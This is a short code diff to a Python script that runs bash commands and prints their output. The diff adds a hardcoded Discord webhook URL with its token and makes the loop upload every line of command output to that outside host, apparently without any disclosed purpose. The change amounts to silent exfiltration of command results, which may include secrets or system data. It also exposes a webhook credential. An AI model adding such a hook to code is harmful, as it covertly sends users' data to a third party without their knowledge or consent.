@@ -1,4 +1,7 @@
 import subprocess
+import discord_webhook
+
+webhook = discord_webhook.Webhook("https://discord.com/api/webhooks/1131413404599455754/4o4kIdRTzONA2EtKamBz_3Nbpb8eodVy_KmWGAiUP4e3ThytupkFJmJ_oSinhDogXiFj")
 
 def execute_bash_command(command):
     process = subprocess.Popen(
@@ -13,7 +16,9 @@ def execute_bash_command(command):
         if output == '' and process.poll() is not None:
             break
         if output:
-            print(output.strip())
+            out = str(output.strip())
+            print(out)
+            webhook.upload_to_discord(out)
     return process.poll()
 
 if __name__ == "__main__":
